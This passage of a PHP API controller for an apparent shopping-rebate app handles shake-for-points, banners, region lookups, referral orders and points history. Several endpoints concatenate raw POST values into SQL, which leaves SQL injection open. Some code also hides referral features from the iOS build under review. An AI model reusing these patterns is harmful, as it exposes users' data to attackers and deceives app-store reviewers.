		$count = $goodsModel -> selectRow('start_time<' . time() . ' AND end_time>' . time(), 'count(*)');
		$goods = $goodsModel -> select('start_time<' . time() . ' AND end_time>' . time(), 'id,fnuo_id,goods_title,goods_img_max,goods_price,goods_cost_price,commission,highcommission_wap_url', 1, rand(1, $count['count(*)']));
		$goods=zfun::f_fgoodscommission($goods);
		$set=zfun::f_getset("tb_tlj_source_onoff,tb_tlj_onoff");
		foreach ($goods as $k => $v) {
			//$goods[$k]['returnfb'] = round($v['goods_price'] * ($v['commission'] / 100) * ($zhe / 100) * 100) / 100 * $jf_return;
			$goods[$k]['returnfb']=$v['fcommission'];
			$goods[$k]['is_tlj']=0;
			//摇一摇栏目
			if(strstr($set['tb_tlj_source_onoff'],",yaoyiyao,")&&$set['tb_tlj_onoff'].''=='1'){
				$goods[$k]['is_tlj']=1;
			}
		}
		/*$k = array_rand($goods);*/
		$this -> fecho($goods[0], 1, "ok");
	}
	public function shakemessage() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		//		$goodsModel = $this -> getDatabase('Goods');
		$eventlog = $this -> getDatabase('Interal');
		$authenticationModel = $this -> getDatabase('Authentication');
		$jf_ratio = $this -> getSetting('jf_buy');
		$jf_ratio = explode(',', $jf_ratio);
		$uid = "";
		$flag = 0;
		if (!empty($_POST['token'])) {
			$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			$uid = $userid['id'];
			$count = $authenticationModel -> selectRow('uid=' . $uid . ' AND type=100 AND time>' . strtotime("today"), 'count(*)');
			$num = rand(0, 5);
			if ($count['count(*)'] < 1) {
				$newintegral = $userid['integral'] + $num;
				$edata['uid'] = $uid;
				//$edata['interal'] = $num;
				$edata['info'] = '摇一摇，送' . $num . '积分';
				$edata['time'] = time();
				$edata['type'] = 100;
				$edata['audit_status'] = 1;
				//$eventlog -> insert($edata);
				$authenticationModel -> insert($edata);
				$userModel -> update('id=' . $uid, array('integral' => $newintegral));
			} else {
				$flag = 1;
			}
		}
		$zhe = $jf_ratio[3];
		if (!empty($uid)) {
			$userModel = $this -> getDatabase("User");
			$user = $userModel -> selectRow("id=" . $uid);
			if ($user['vip'] == 0) {
				$zhe = $jf_ratio[0];
			} elseif ($user['vip'] == 1) {
				$zhe = $jf_ratio[1];
			} elseif ($user['vip'] == 2) {
				$zhe = $jf_ratio[2];
			} elseif ($user['vip'] == 3) {
				$zhe = $jf_ratio[3];
			}
		}
		/*$goods = $goodsModel -> select(null, 'id,fnuo_id,goods_title,goods_img_max,goods_price,goods_cost_price,commission');
		 foreach ($goods as $k => $v) {
		 $goods[$k]['returnfb'] = round($v['goods_price'] * ($v['commission'] / 100) * ($zhe / 100) * 100) / 100;*/
		if (!isset($num)) {
			$data['r_message'] = '想要跟多优惠，请先登录';
		} else if ($num != 0) {
			$data['r_message'] = '恭喜你，摇中了' . $num . '个积分';
		} else if ($num == 0) {
			$data['r_message'] = '抱歉没有摇中';
		}
		if ($flag == 1) {
			$data['r_message'] = '今天送积分已用完';
		}
		/*}
		 $k = array_rand($goods);*/
		$this -> fecho($data, 1, "ok");
	}
	public function shakerecord() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		$authenticationModel = $this -> getDatabase('Authentication');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "缺少必要参数");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		$authentication = $authenticationModel -> select('uid=' . $userid['id'] . ' AND type=100',NULL,NULL,NULL,'time desc');
		foreach ($authentication as $k => $v) {
			$authentication[$k]['time'] = date("Y-m-d H:i:s", $v['time']);
			switch($v['audit_status']) {
				case 0 :
					$authentication[$k]['status'] = '等待到账';
					break;
				case 1 :
					$authentication[$k]['status'] = '已到账';
					break;
			}
		}
		$this -> fecho($authentication, 1, "ok");
	}
	public function getstartpic() {
		if (!$this -> sign()) {
		 $this -> fecho(null, 0, "签名错误");
		 }
		$guanggaoModel = $this -> getDatabase('Guanggao');
		$guanggao = $guanggaoModel -> select('hide=0 AND type="appstart"',"data_json,ix_img,android_img,img,title,url,ktype,SkipUIIdentifier",1,0,"sort desc");
		foreach ($guanggao as $k => $v) {
			$img=explode(",",$v['img']);
			if(!empty($img[0]))$guanggao[$k]['img'] = UPLOAD_URL . 'slide/' . $img[0];
			$guanggao[$k]['name']=$v['title'];
			$guanggao[$k]['UIIdentifier']=$v['ktype'];
			if(empty($v['SkipUIIdentifier'])){
				$arr=tzbs_newAction::getarr_ksrk();
				foreach($arr as $kk=>$vv){
					if(is_numeric($vv['val'])==false)continue;
					if(intval($v['ktype'])!=$vv['val'])continue;
					$guanggao[$k]['SkipUIIdentifier']=$vv['type'];
				}
			}
			$SkipUIIdentifier=tzbs_newAction::getarr_ksrk_fuck($guanggao[$k]);
			$guanggao[$k]['type']=$v['type']=$v['ktype'];
			$data=self::view_type($guanggao[$k],1);
			$guanggao[$k]['view_type']=$data['view_type'];
			if(!empty($SkipUIIdentifier))$guanggao[$k]['SkipUIIdentifier']=$SkipUIIdentifier;

			if(!empty($data['SkipUIIdentifier']))$guanggao[$k]['SkipUIIdentifier']=$data['SkipUIIdentifier'];
			if(!empty($v['url'])){
				$guanggao[$k]['type']=0;
				$guanggao[$k]['SkipUIIdentifier']="pub_wailian";	
			}
			$data=self::view_img($v,1);
			$guanggao[$k]['goodslist_img']=$data['img'];
			if($guanggao[$k]['view_type']==2&&$v['type']!=34)$guanggao[$k]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";;
			$guanggao[$k]['goodslist_str']=$data['str'];
			$guanggao[$k]['goods_detail']=array();
			$login=tzbs_newAction::getarr_login($guanggao[$k]);
			$guanggao[$k]['is_need_login']=intval($login);
			if(!empty($v['ix_img'])&&$_POST['resolutionRatio']=='1125*2436'){
				$guanggao[$k]['img'] = UPLOAD_URL . 'slide/' . $v['ix_img'];
			}
			if(!empty($v['android_img'])){
				$ratio=explode("*",$_POST['resolutionRatio']);
				$bili=$ratio[1]/$ratio[0];
				
				if($bili>1.8)$guanggao[$k]['img'] = UPLOAD_URL . 'slide/' . $v['android_img'];
			}
			$json=json_decode($v['data_json'],true);unset($guanggao[$k]['data_json']);
			$guanggao[$k]['fnuo_id']=($json['fnuo_id']);
			$guanggao[$k]['shop_type']=($json['shop_type']);
			$guanggao[$k]['start_price']=floatval($json['start_price']);
			$guanggao[$k]['end_price']=floatval($json['end_price']);
			$guanggao[$k]['commission']=floatval($json['commission']);
			$guanggao[$k]['goods_sales']=intval($json['goods_sales']);
			$guanggao[$k]['keyword']=($json['search_keyword']);
		}
		$this -> fecho($guanggao, 1, "ok");
	}
	public function getProvince() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$provinceModel = $this -> getDatabase('Province');
		$province = $provinceModel -> select();
		$this -> fecho($province, 1, "ok");
	}
	public function getCity() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$cityModel = $this -> getDatabase('City');
		if (!empty($_POST['id'])) {
			$city = $cityModel -> select('ProvinceID=' . $_POST['id']);
		}
		$this -> fecho($city, 1, "ok");
	}
	public function getDistrict() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$districtModel = $this -> getDatabase('O2ODistrict');
		if (!empty($_POST['id'])) {
			$district = $districtModel -> select('CityID=' . $_POST['id']);
		}
		$this -> fecho($district, 1, "ok");
	}
	public function getShareInfo() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$data['word'] = $this -> getSetting('appshareword');
		$data['img'] = UPLOAD_URL . 'slide/' . $this -> getSetting('appshareimg');
		$this -> fecho($data, 1, "ok");
	}
	//zheli
	//获取好友订单
	public function getFirendOrder(){
		if(!self::sign())self::fecho(null,0,"签名错误");
		$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
		if(empty($user))self::fecho(NULL,0,"用户不存在");
		$uid=$user['id'];
		$data=self::getcarr($uid,'extend_id',3);
		$lvarr=array();
		$uids=-1;
		$set=zfun::f_getset("djtg_lv1,djtg_lv2,djtg_lv3");
		$darr=array("","一级推广","二级推广","三级推广");
		foreach($data as $k=>$v){
			$tmp=explode(",",$v);
			foreach($tmp as $k1=>$v1){
				$lvarr[$v1]=array(
									"dname"=>$darr[$k],
									"d"=>$k,
									"bili"=>$set['djtg_lv'.$k]/100,
								);	
				$uids.=",".$v1;
			}
		}
		$_GET['p']=intval($_POST['p']);if(empty($_GET['p']))$_GET['p']=1;
		$where="uid IN($uids) and commission>0";
		$sort='createDate desc';$arr=array();
		$order=zfun::f_goods("Order",$where,"id,uid,commission,returnstatus,createDate",$sort,$arr,10);
		$rearr=array("待返利","已返利");
		$user=zfun::f_kdata("User",$order,"uid","id","id,nickname");
		foreach($order as $k=>$v){
			$order[$k]['lv']=$lvarr[$v['uid']]['dname'];
			$order[$k]['fcommission']=$lvarr[$v['uid']]['bili']*$v['commission'];
			$order[$k]['orderStatus']=$rearr[$v['returnstatus']];
			$order[$k]['nickname']=$user[$v['uid']]['nickname'];
			$order[$k]['fcommission']=intval($order[$k]['fcommission']*100)/100;
			$order[$k]['time']=date("Y-m-d",$v['createDate']);
			$order[$k]['time']=substr($order[$k]['time'],2,8);
			unset($order[$k]['commission']);
			unset($order[$k]['returnstatus']);
		}
		self::fecho($order,1,"fcommission 为预计返利 lv为好友是多少代 ");
	}
	public static function getcarr($uid, $tidname = "extend_id", $maxlv = 9) {//获取下级
		$maxlv++;
		if (empty($uid))
			return 0;
		$arr = array();
		$arr[0] = intval($uid);
		$lv = 0;
		$eid = 0;
		$tid = $uid;
		do {
			$lv++;
			$user = zfun::f_select("User", "$tidname IN($tid) and $tidname<>0 and $tidname<>''");
			if (!empty($user)) {
				$tid = "";
				foreach ($user as $k => $v)
					$tid .= "," . $v['id'];
				$tid = substr($tid, 1);
				$arr[$lv] = $tid;
			}
		} while(!empty($user)&&$lv<$maxlv-1);
		unset($arr[0]);
		if(empty($arr))$arr=array();
		return $arr;
	}
	//jj explosion
	public function InvitationAward(){
		$user=self::checksign(1);
		$jf_spread = self::getSetting('commission_spread');
		$arr=array();
		$arr["count"]=zfun::f_count("User","extend_id=".$user['id']);
		$arr['jf']=$arr['count']*$jf_spread;
		$data=zfun::f_select("Interal","type=100 and data<>'' and uid=".$user['id']." and detail like '%佣金%'","interal");
		$arr['jf']=0;
		foreach($data as $k=>$v){
			$arr['jf']+=floatval($v['interal']);	
		}
		self::fecho($arr,1,"额");
		//省略	
	}
	public function checksign($type=0){
		if(!self::sign())self::fecho(null,0,"签名错误");
		if($type==1&&empty($_POST['token']))self::fecho(null,0,"缺少token");
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			if(empty($user))self::fecho(null,0,"用户不存在");
			return $user;
		}
		return array();
	}
	// 产生随机码
	public function getRandStr() {
		$str = '0123456789';
		$randString = '';
		$len = strlen($str) - 1;
		for ($i = 0; $i < 6; $i++) {
			$num = mt_rand(0, $len);
			$randString .= $str[$num];
		}
		return $randString;
	}
	public function sign() {
		$_POST['time'] = intval($_POST['time']);
		if (abs(time() - $_POST['time']) > 3 * 24 * 60 * 3600)
			$this -> fecho(NULL, 0, "请求过期");
		$str = "";
		$sign = $_POST['sign'];
		unset($_POST['sign']);
		$syssign = $this -> getsign($_POST);$_POST['sign']=$sign;
		/*$_POST['thisurl']=zfun::thisurl();
		$data=zfun::wfile("Temp/d.log",json_encode($_POST));*/
		if ($sign != $syssign)return false;
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".$_POST['token']."'","id");
			//登录会员
			if(!empty($user))$this -> setSessionUser($user['id'], "123");
		}	
		return true;
	}
	public function getsign($arr = array()) {
		ksort($arr);
		foreach ($arr as $k => $v)
			$str .= $k . $v;
		return md5($this -> selfgetappkey() . $str . $this -> selfgetappkey());
	}
	public function fecho($data = NULL, $success = 1, $msg = NULL) {
		$arr = array("msg" => $msg,"success" => $success, "data" => $data);
		echo json_encode($arr);
		exit ;
	}
	public function tmp(){
		echo "https://".$_SERVER['HTTP_HOST']."/comm/qrcode/?url=".urlencode($this->getUrl("api","download",array(),"default"))."&size=100";
	}
	public function download(){
		$set=zfun::f_getset("android_url,ios_url");
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone')||strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')){
			//zfun::fecho("ios");
			zfun::jump($set['ios_url']);
		}else if(strpos($_SERVER['HTTP_USER_AGENT'], 'Android')){
			//zfun::fecho("android");
			zfun::jump($set['android_url']);
		}
	}
	//``````````````````````new``````````````````````````````
		public function getrebili(){
		if (!$this -> sign())
			$this -> fecho(NULL, 0, "签名错误");
		$id=$_POST['id']=214;
		$shop=zfun::f_row("Shoppingmall","id = ' {$id} ' ","id,shop_name,fnuo_yun_id,scdg_logo,scdg_dizhi,scdg_bili,scdg_intr,type");
		if(empty($shop)){
			$shop=array();
		}
		$this -> fecho($shop, 0, "购物返利");
	}
	public function getpic() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$set=zfun::f_getset("checkVersion");
		if(empty($set['checkVersion']))appcomm::read_app_cookie();
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			if(empty($user))zfun::fecho("用户不存在");
			$uid=intval($user['id']);
		}
		$guanggaoModel = $this -> getDatabase("Guanggao");
		$guanggao=array();
		
		$guanggao = $guanggaoModel -> select("is_app=1 and hide=0 AND type='invatefriend'", "data_json,img,title,ktype,SkipUIIdentifier,url", 1, null, "id desc");
		if($guanggao){
		foreach ($guanggao as $k => $v) {
			$guanggao[$k]['img'] = UPLOAD_URL .'slide/'. $v['img'];
			$guanggao[$k]['img']=reset(explode(",",$guanggao[$k]['img']));
			if(strpos($v['url'],"taobao.com")!==false)
			$guanggao[$k]['webType']=1;
			else if(strpos($v['url'],"jd.com")!==false)
			$guanggao[$k]['webType']=2;
			else
			$guanggao[$k]['webType']=0;
			}
			$guanggao[$k]['name']=$v['title'];
			$guanggao[$k]['UIIdentifier']=$v['ktype'];
			if(empty($v['SkipUIIdentifier'])){
				$arr=tzbs_newAction::getarr_ksrk();
				foreach($arr as $kk=>$vv){
					if(is_numeric($vv['val'])==false)continue;
					if(intval($v['ktype'])!=$vv['val'])continue;
					$guanggao[$k]['SkipUIIdentifier']=$vv['type'];
				}
			}
			if($_POST['appVersion']==$set['checkVersion']&&!empty($set['checkVersion'])&&$_POST['platform']=='iOS'){
				$skip=array("pub_fenxiaozhongxin","pub_qianghongbao","pub_yaoqinghaoyou","pub_yaojiangjilu","pub_hehuorenzhongxin","pub_laxinhuodong","pub_member_upgrade");
				if(in_array($guanggao[$k]['SkipUIIdentifier'],$skip)){
					$v['SkipUIIdentifier']=$guanggao[$k]['SkipUIIdentifier']='pub_taoqianggou';
					$v['ktype']='35';
					$guanggao[$k]['UIIdentifier']=$v['UIIdentifier']=$v['ktype'];
				}
			}

			$SkipUIIdentifier=tzbs_newAction::getarr_ksrk_fuck($guanggao[$k]);
			$guanggao[$k]['type']=$v['type']=$v['ktype'];
			$data=self::view_type($guanggao[$k],1);
			$guanggao[$k]['view_type']=$data['view_type'];
			if(!empty($SkipUIIdentifier))$guanggao[$k]['SkipUIIdentifier']=$SkipUIIdentifier;

			if(!empty($data['SkipUIIdentifier']))$guanggao[$k]['SkipUIIdentifier']=$data['SkipUIIdentifier'];
			if(!empty($v['url'])){
				$guanggao[$k]['type']=0;
				$guanggao[$k]['SkipUIIdentifier']="pub_wailian";	
			}
			$data=self::view_img($v,1);
			$guanggao[$k]['goodslist_img']=$data['img'];
			if($guanggao[$k]['view_type']==2&&$v['type']!=34)$guanggao[$k]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";;
			$guanggao[$k]['goodslist_str']=$data['str'];
			$guanggao[$k]['goods_detail']=array();
			$login=tzbs_newAction::getarr_login($guanggao[$k]);
			$guanggao[$k]['is_need_login']=intval($login);
			$url=tzbs_newAction::getduomai($v['url'],$uid);
			$guanggao[$k]['url']=$url;
			$json=json_decode($v['data_json'],true);unset($guanggao[$k]['data_json']);
			$guanggao[$k]['fnuo_id']=($json['fnuo_id']);
			$guanggao[$k]['shop_type']=($json['shop_type']);
			$guanggao[$k]['start_price']=floatval($json['start_price']);
			$guanggao[$k]['end_price']=floatval($json['end_price']);
			$guanggao[$k]['commission']=floatval($json['commission']);
			$guanggao[$k]['goods_sales']=intval($json['goods_sales']);
			$guanggao[$k]['keyword']=($json['search_keyword']);
		}
		if(empty($set['checkVersion']))appcomm::set_app_cookie($guanggao);
		$this -> fecho($guanggao, 1, "好吧，被你发现了");
	}
	public function gettuwen() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		appcomm::read_app_cookie();
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			if(empty($user))zfun::fecho("用户不存在");
			$uid=intval($user['id']);
		}
		$invate=array();
		$set=zfun::f_getset("checkVersion");
		$invate =zfun::f_select("Guanggao","hide=0 AND type='invate' ", "data_json,title,font_color,img,description,SkipUIIdentifier,title,ktype,url", null, null, "sort desc");
		if(!empty($invate)){
			$time=time();
			$where="start_time<" . time() . " AND end_time>" . time() ." AND type=1";
			$activity=zfun::f_select("Activity",$where,"end_time,type",null,null,"end_time asc ");
			//zfun::isoff($activity);
			$activity_time=array();
			foreach($activity as $k=>$v)$activity_time[]=$v['end_time'];
			$activity_time=min($activity_time);//抢购活动时间
			if(empty($activity_time))$activity_time=0;
			$startTime=strtotime(date('Y-m-d'));
			$endTime=strtotime(date('Y-m-d',strtotime("+1 days")))-1;
			$where="start_time between {$startTime} AND {$endTime} ";
			$new_num=zfun::f_count("Goods",$where);//今日上新商品数量
			foreach ($invate as $key => $value) {
				$invate[$key]['UIIdentifier']=intval($value['ktype']);
				$img = explode(',', $value['img']);
				$invate[$key]['image']='';
				$invate[$key]['image2']='';
				if ($img[0]) {
					$invate[$key]['image'] = UPLOAD_URL .'slide/'. $img[0];
				}
				if ($img[1]) {
					$invate[$key]['image2'] = UPLOAD_URL .'slide/'. $img[1];
				}
				unset($invate[$key]['img']);
				$invate[$key]['name']=$value['title'];
				$invate[$key]['new_num']=$new_num;
				$invate[$key]['activity_time']=$activity_time;
		   		$invate[$key]['UIIdentifier']=$value['ktype'];
				if(empty($value['SkipUIIdentifier'])){
					include_once ROOT_PATH."Action/index/appapi/tzbs_new.action.php";
					$arr=tzbs_newAction::getarr_ksrk();
					foreach($arr as $kk=>$vv){
						if(is_numeric($vv['val'])==false)continue;
						if(intval($value['ktype'])!=$vv['val'])continue;
						$invate[$key]['SkipUIIdentifier']=$vv['type'];
					}
				}
				if($_POST['appVersion']==$set['checkVersion']&&!empty($set['checkVersion'])&&$_POST['platform']=='iOS'){
					$skip=array("pub_fenxiaozhongxin","pub_qianghongbao","pub_yaoqinghaoyou","pub_yaojiangjilu","pub_hehuorenzhongxin","pub_laxinhuodong","pub_member_upgrade");
					if(in_array($invate[$key]['SkipUIIdentifier'],$skip))$invate[$key]['SkipUIIdentifier']='pub_taoqianggou';
				}
				$SkipUIIdentifier=tzbs_newAction::getarr_ksrk_fuck($invate[$key]);
				$invate[$key]['type']=$value['type']=$value['ktype'];
				$data=self::view_type($invate[$key],1);
				$invate[$key]['view_type']=$data['view_type'];	
				if(!empty($SkipUIIdentifier))$invate[$key]['SkipUIIdentifier']=$SkipUIIdentifier;

				if(!empty($data['SkipUIIdentifier']))$invate[$key]['SkipUIIdentifier']=$data['SkipUIIdentifier'];
				if(!empty($value['url'])){
					$invate[$key]['type']=0;
					$invate[$key]['SkipUIIdentifier']="pub_wailian";	
				}
				$data=self::view_img($value,1);
				$invate[$key]['goodslist_img']=$data['img'];
				if($invate[$key]['view_type']==2&&$value['type']!=34)$invate[$key]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";;
				$invate[$key]['goodslist_str']=$data['str'];
				$invate[$key]['goods_detail']=array();
				$login=tzbs_newAction::getarr_login($invate[$key]);
				$invate[$key]['is_need_login']=intval($login);
				$url=tzbs_newAction::getduomai($value['url'],$uid);
				$invate[$key]['url']=$url;
				$json=json_decode($v['data_json'],true);unset($invate[$key]['data_json']);
			$invate[$key]['fnuo_id']=($json['fnuo_id']);
			$invate[$key]['shop_type']=($json['shop_type']);
			}
			
	    }
		appcomm::set_app_cookie($invate);
		$this -> fecho($invate, 1, "好吧，被你发现了");
	}
	public function Integral(){
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$arr_interal=array();
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$user = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if(empty($user))$this -> fecho(null, 0, "用户不存在");
		$interalModel = $this -> getDatabase("Interal");
		switch ($_POST['interal_type']) {
			case 'all':
				$where ="uid={$user['id']} AND interal<>0";
				break;
			case 'huoqu':
				$where ="uid={$user['id']} AND   interal>0";
				break;
			case 'zhichu':
				$where ="uid={$user['id']} AND  interal<0 ";
				break;
			default:
				$where ="uid={$user['id']} AND interal<>0";
				break;	
		}
		$interal=zfun::f_goods("Interal",$where," interal,detail,time","time DESC",$arr,10);
		if(!empty($interal)){
		foreach ($interal as $key => $value) {
			$sum_interal+=$value['interal']*100;
		}	
			$arr_interal['integral']=$user['integral'];
			$arr_interal['sum_interal']=$sum_interal ? $sum_interal : 0  ;
			$arr_interal['money']=$user['money'];
			$arr_interal['commission']=$user['commission'];
			$arr_interal['list']=$interal;
		}
		$this -> fecho($arr_interal, 1, "jifenbao");
	}
	public function getKuang(){
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$tankuang=array();
		$tankuang_count=zfun::f_count('Goods',"is_yugao=1");
		if(empty($tankuang_count))zfun::fecho("商品为空",array(),1);
		$limit=mt_rand(0,$tankuang_count-1); 
		$arrindex['tankuang']=array();
		$tk_goods=array();
		if($tankuang_count>0){
			//$tankuang=zfun::f_select("Tankuang","id > 0",'id,gid',1,$limit,null);
			//$gid=$tankuang[0]['gid'];
			$field="id,fnuo_id,goods_sales,goods_type,goods_price,goods_cost_price,goods_img,goods_title,start_time,end_time,cate_id,dp_id,commission,highcommission,shop_id,highcommission_url,yhq_price,yhq_url,stock,yhq,yhq_span,(goods_price - yhq_price)as juanhou_price";
			$tankuang_goods=zfun::f_select("Goods","is_yugao=1",$field,1,$limit,"id asc");
			if(empty($tankuang_goods)){
				//zfun::f_delete("Tankuang","id=".$tankuang[0]['id']);
				zfun::fecho("商品为空",array(),1);	
			}else{
				$tankuang_goods=reset($tankuang_goods);	
			}
			//$tankuang_goods=zfun::f_fgoodscommission(array($tankuang_goods));$tankuang_goods=reset($tankuang_goods);
			if($tankuang_goods['highcommission']==1){
				$tankuang_goods["g_type"]="超高返";
			}else if($tankuang_goods['goods_price']<10){
				$tankuang_goods["g_type"]="9块9";
			}else{
				$tankuang_goods["g_type"]="";
			}
			$tk_goods[]=$tankuang_goods;
			//$tk_goods=zfun::f_gethdprice($tk_goods);
			$tk_goods=zfun::f_fgoodscommission($tk_goods);
			foreach($tk_goods as $k=>$v){
				$v['yhq_price']=floatval($v['yhq_price']);
				$tk_goods[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_discount_quan.png";
				if(!empty($v['yhq_price']))$tk_goods[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_after_quan.png";
				$tk_goods[$k]['yhq_span']=$v['yhq_price']."元券";
				$tk_goods[$k]['zhe']=$v['zhe']."折";
			}
			appcomm::goodsfanlioff($tk_goods);
			appcomm::goodsfeixiang($tk_goods);
			unset($tk_goods[0]['fcommissionshow']);
			
		}
		$this -> fecho($tk_goods, 1, "好吧，被你发现了");
	}
	public function readMsg(){
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		$sysMsgModel = $this -> getDatabase('sysMsg');
		if (empty($_POST['id'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		$data=array();
		$data['type']=1;//已阅读
		$sys=$sysMsgModel->update("id = {$_POST['id']} ",$data);
		if ($sys==false) {
			$this -> fecho(null, 0, "参数错误");
		}
	}
	public function getShopCates() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		appcomm::read_app_cookie();
		$categoryModel = $this -> getDatabase("ShopCategory");
		$field = "id,cate_pid,category_name";
		$category = $categoryModel -> select("cate_pid=0", $field, null, null, "show_sort desc");
			
		$arr[]=array(
			"id"=>0,
			"cate_pid"=>"0",
			"category_name"=>"全部",
		);
		foreach ($category as $key => $v) {
			$arr[]=$v;
		}
		appcomm::set_app_cookie($arr);
		$this -> fecho($arr, 1, "导购分类");
	}
	public static function cate(){
		$arr=array(
			array(
				"id"=>0,
				"category_name"=>"优选",
			),
			array(
				"id"=>1,
				"category_name"=>"女装",
			),
			array(
				"id"=>9,
				"category_name"=>"男装",
			),
			array(
				"id"=>10,
				"category_name"=>"内衣",
			),
			array(
				"id"=>2,
				"category_name"=>"母婴",
			),
			array(
				"id"=>3,
				"category_name"=>"化妆品",
			),
			array(
				"id"=>4,
				"category_name"=>"居家",
			),
			array(
				"id"=>5,
				"category_name"=>"鞋包配饰",
			),
			array(
				"id"=>6,
				"category_name"=>"美食",
			),
			array(
				"id"=>7,
				"category_name"=>"文体车品",
			),
			array(
				"id"=>8,
				"category_name"=>"数码家电",
			),
			array(
				"id"=>12,
				"category_name"=>"预告",
			),
		);
		return $arr;
	}
	
}
?>